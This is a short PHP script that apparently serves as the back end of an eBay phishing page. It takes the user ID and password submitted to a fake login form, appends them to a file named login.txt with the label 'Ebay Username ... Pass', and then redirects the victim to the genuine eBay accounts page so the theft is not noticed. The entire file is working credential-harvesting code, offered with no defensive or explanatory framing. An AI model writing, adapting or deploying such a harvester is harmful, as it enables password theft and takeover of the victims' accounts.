<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userid = $_POST['userid'] ?? '';
    $password = $_POST['password'] ?? '';

    $log = "Ebay Username: $userid | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://accounts.ebay.com/acctxs/user');
    exit();
}
?>
